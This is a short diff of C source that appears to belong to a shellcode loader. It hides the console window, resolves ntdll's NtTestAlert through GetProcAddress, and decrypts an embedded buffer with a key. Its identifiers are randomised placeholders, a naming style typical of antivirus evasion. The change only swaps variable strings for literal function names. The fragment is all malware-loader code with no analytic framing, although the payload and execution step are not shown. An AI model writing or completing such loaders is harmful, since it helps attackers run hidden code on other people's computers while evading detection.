@@ -52,7 +52,7 @@ int main()
         
       
 	FreeConsole();
-	Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA(sNTD), sTest));
+	Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
 	SIZE_T Random4 = sizeof(Random3);
 	
 	Random1((char *) Random3, Random3_len, Random2, sizeof(Random2));
